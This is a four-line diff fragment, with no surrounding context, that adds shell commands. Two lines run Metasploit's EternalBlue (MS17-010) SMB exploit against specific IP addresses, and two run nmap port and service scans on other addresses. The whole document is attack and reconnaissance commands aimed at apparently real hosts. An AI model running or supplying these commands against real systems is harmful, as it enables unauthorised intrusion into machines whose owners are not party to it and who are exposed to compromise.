@@ -1,0 +1,4 @@
+msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 61.27.160.121; exploit'
+nmap -sV -p 1-1024 227.139.24.191
+nmap -sV -p 1-1024 32.17.20.14
+msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 46.96.201.210; exploit'
